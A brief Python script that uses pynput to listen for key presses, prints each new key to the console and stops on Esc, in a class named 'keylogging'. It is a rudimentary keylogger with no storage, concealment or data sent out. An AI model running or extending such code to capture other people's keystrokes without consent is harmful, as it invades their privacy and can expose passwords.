import pynput
from pynput.keyboard import Key, Listener

info = ''
class keylogging:
	def on_press(key):
		global info
		k = str(key).replace("'","")
		if info != k:
			info = k
			print(info)
		if key == Key.esc:
			# Stop listener
			return False
		

listener = Listener(on_press=keylogging.on_press)
listener.start()


	
